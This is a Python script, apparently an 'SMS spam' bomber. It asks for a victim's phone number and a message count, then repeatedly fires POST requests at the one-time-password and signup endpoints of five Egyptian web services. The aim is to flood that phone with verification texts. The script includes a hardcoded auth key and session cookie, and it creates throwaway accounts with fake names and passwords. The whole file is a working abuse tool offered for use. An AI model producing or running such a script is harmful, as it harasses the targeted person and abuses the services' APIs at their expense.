import requests
import pyfiglet
import json
import webbrowser
red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[1;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'

ascii_art = pyfiglet.figlet_format("El Jo Net")
print(red_color + ascii_art)
print("")
ascii_art2 = pyfiglet.figlet_format("Spam sms")
print(light_yellow_color + ascii_art2)
print(light_blue_color + "by code: Elgzar ")
print(blue_color + "By code: Elgzar")
print("")

nu = input(green_color + "Enter a number : " + light_blue_color)
print("")
#webbrowser.open('https://t.me/ElJoNet208')
m = int(input(green_color + "Enter a Number of messages  : " + light_blue_color))
print("")

for _ in range(m):
    print("-" * 50)
    
    url = f'https://2b.com.eg/mobikulhttp/customer/createAccountotp?email=ElJoNet_spam%405gmail.com&mobile={nu}&quoteId=0&storeId=2&password=ElJoNet_spam_2082&lastName=spam%20&firstName=ElJoNet%20&middleName='
    headers = {
        'Host': '2b.com.eg',
        'content-type': 'text/html',
        'authkey': '1a6cf9b498f09ed13486177470e8a2ef',
        'content-length': '0',
        'accept-encoding': 'gzip',
        'cookie': 'PHPSESSID=8caf54eb965760ae66a831814f137587; private_content_version=59ae5b112089a8a6a985bebc76bc4d1d',
        'user-agent': 'okhttp/3.12.1'
    }
    r = requests.post(url, headers=headers)
    if r.status_code == 200:
        print(light_green_color + "Done sent 👍")
    else:
        print(red_color + "Failed to send 👍")

    print("-" * 50)
    
    url = "https://api.twistmena.com/shuffle/tprofile/Dlogin/sendCode"
    headers = {
        "Host": "api.twistmena.com",
        "accept": "application/json",
        "accept-language": "en",
        "appversion": "10.4.85",
        "platform": "android",
        "channel": "mobileapp",
        "content-type": "application/json",
        "content-length": "23",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/4.9.1"
    }
    data = '{"dial":"2%s"}' % nu
    r2 = requests.post(url, headers=headers, data=data)
    if r2.status_code == 200:
        print(light_green_color + "Done sent 👍")
    else:
        print(red_color + "Failed to send 👍")

    print("-" * 50)
    
    url = "https://ev-api.aws.playco.com/api/v1.0/eg/twist/send-otp"
    headers = {
        'Host': 'ev-api.aws.playco.com',
        'content-type': 'application/json; charset=UTF-8',
        'content-length': '30',
        'accept-encoding': 'gzip',
        'user-agent': 'Twist TV/StarzAPP(com.twist.tv;build:2027;Android:12)',
        'accept': 'application/json',
        'client-type': 'Huawei',
        'x-tracker-id': '',
        'x-app-ad-id': ''
    }
    data = '{"phoneNumber":"2%s"}' % nu
    r3 = requests.post(url, headers=headers, data=data)
    if r3.status_code == 200:
        print(light_green_color + "Done sent 👍")
    else:
        print(red_color + "Failed to send 👍")

    print("-" * 50)
    
    url = 'https://backend.forsaegypt.com/api/v1/accounts/verification/phone/resend_otp/'
    data = {
        "phone": f"+2{nu}",
        "signature": 33008
    }
    json_data = json.dumps(data)
    headers = {
        'accept': 'application/json',
        'Content-Type': 'application/json',
        'User-Agent': 'okhttp/4.9.2'
    }
    r4 = requests.post(url, headers=headers, data=json_data)
    if r4.status_code == 200:
        print(light_green_color + "Done sent 👍")
    else:
        print(red_color + "Failed to send 👍")

    print("-" * 50)
    
    url = "https://www.breadfast.com/ar/wp-json/breadfast/v4/user/send-otp"
    data = {
        "phone": nu,
        "country_code": "EG"
    }
    r5 = requests.post(url, json=data)
    if r5.status_code == 200:
        print(light_green_color + "Done sent 👍")
    else:
        print(red_color + "Failed to send 👍")

    print("-" * 50)
